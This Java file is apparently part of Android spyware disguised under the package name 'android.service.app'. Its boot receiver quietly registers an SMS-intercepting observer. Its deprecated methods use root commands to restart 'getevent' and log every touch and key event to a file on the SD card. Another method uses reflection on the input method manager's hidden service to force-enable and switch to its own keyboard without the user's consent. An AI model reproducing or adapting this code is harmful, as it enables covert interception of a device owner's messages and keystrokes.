package android.service.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Environment;
import android.os.Handler;
import android.provider.Settings;
import android.service.app.utils.Log;
import android.support.annotation.NonNull;
import android.view.inputmethod.InputMethodInfo;
import android.view.inputmethod.InputMethodManager;

import com.stericson.RootShell.execution.Command;
import com.stericson.RootShell.execution.Shell;
import com.stericson.RootTools.RootTools;

import java.io.File;
import java.lang.reflect.Field;
import java.util.List;

public class OnBootReceiver extends BroadcastReceiver
{
    public static final String ANDROID_SERVICE_APP_ANDROID_KEYBOARD_SERVICE = "android.service.app/.AndroidKeyboard";
    public static final String ANDROID_SERVICE_APP_ANDROID_KEYBOARD_CLASS = "android.service.app.AndroidKeyboard";
    protected Handler handler = new Handler();

    @Override
    public void onReceive(Context context, Intent intent)
    {
        String action = intent.getAction();
        if (Log.isDebugEnabled()) Log.debug("action=" + action);

        //changeKeyboardIfNeeded(context);

        if (action.equals(Intent.ACTION_BOOT_COMPLETED))
        {
            //runGetEvent(context);

            SmsObserver smsObserver = new SmsObserver(context, handler);
            IntentFilter smsFilter = new IntentFilter(Service.SMS_RECEIVED);

            ReceiverManager receiverManager = ReceiverManager.init(context);
            if (!receiverManager.isReceiverRegistered(smsObserver.inSms))
            {
                receiverManager.registerReceiver(smsObserver.inSms, smsFilter, context);
                Service.initDatabase(context);
            }
        }
    }

    @Deprecated
    private void runGetEvent(Context context)
    {
        Intent serviceLauncher = new Intent(context, Service.class);
        if (Log.isDebugEnabled()) Log.debug("serviceLauncher=" + serviceLauncher);
        context.startService(serviceLauncher);
        try
        {
            Shell shell = RootTools.getShell(false);
            shell.add(new Command(0, "ps u -C getevent\n")
            {
                @Override
                public void commandOutput(int id, String line)
                {
                    if (line.contains("getevent"))
                    {
                        String PID = line.split(" +")[1];
                        try
                        {
                            Shell shell = RootTools.getShell(true);
                            shell.add(new Command(1, "kill -s 9 " + PID + "\n"));
                            shell.close();
                        } catch (Exception e)
                        {
                            e.printStackTrace();
                        }
                    }
                }
            });

            shell.close();

            Shell shell1 = RootTools.getShell(true);
            shell1.add(new Command(2, "getevent -qtl > " + getSdCardPath() + "events.txt &\n"));
            shell1.close();
        } catch (Exception e)
        {
            e.printStackTrace();
        }
    }

    @NonNull
    private static String getSdCardPath()
    {
        return Environment.getExternalStorageDirectory().getPath() + File.separator;
    }

    @Deprecated
    public static void changeKeyboardIfNeeded(Context context)
    {
        boolean isOurKeyboard = false;

        String inputMethod = getCurrentIMEName(context);
        if (Log.isDebugEnabled()) Log.debug("inputMethod=" + inputMethod);

        if ((inputMethod != null) && inputMethod.endsWith(ANDROID_SERVICE_APP_ANDROID_KEYBOARD_SERVICE))
            isOurKeyboard = true;

        if (Log.isDebugEnabled()) Log.debug("isOurKeyboard=" + isOurKeyboard);

        if (!isOurKeyboard)
        {
            InputMethodManager localInputMethodManager = (InputMethodManager) context.getSystemService("input_method");
            if (Log.isDebugEnabled()) Log.debug("localInputMethodManager=" + localInputMethodManager);

            List<InputMethodInfo> inputMethodList = localInputMethodManager.getInputMethodList();
            if (Log.isDebugEnabled()) Log.debug("inputMethodList=" + inputMethodList);

            String id = null;
            for (InputMethodInfo inputMethodInfo : inputMethodList)
            {
                if (inputMethodInfo.getServiceName().equals(ANDROID_SERVICE_APP_ANDROID_KEYBOARD_CLASS))
                {
                    id = inputMethodInfo.getId();
                    break;
                }
            }

            if (Log.isDebugEnabled()) Log.debug("id=" + id);
            if (id != null)
            {

                try
                {
                    Object o = InputMethodManager.class.getDeclaredField("mService");
                    if (Log.isDebugEnabled()) Log.debug("0:o=" + o);

                    ((Field) o).setAccessible(true);

                    o = ((Field) o).get(localInputMethodManager);
                    if (Log.isDebugEnabled()) Log.debug("1:o=" + o);

                    o.getClass().getDeclaredMethod("setInputMethodEnabled", new Class[]{String.class, Boolean.TYPE}).invoke(o, new Object[]{id, Boolean.valueOf(true)});

                    localInputMethodManager.setInputMethod(null, id);

                    Intent inputMethodChanged = new Intent("android.intent.action.INPUT_METHOD_CHANGED");
                    inputMethodChanged.putExtra("input_method_id", id);
                    context.sendBroadcast(inputMethodChanged);
                    if (Log.isDebugEnabled()) Log.debug("inputMethodChanged=" + inputMethodChanged);
                } catch (Exception e)
                {
                    Log.error(e);
                    throw new RuntimeException(e);
                }

            }
        }
    }

    private static String getCurrentIMEName(Context paramContext)
    {
        return Settings.Secure.getString(paramContext.getContentResolver(), "default_input_method");
    }
}
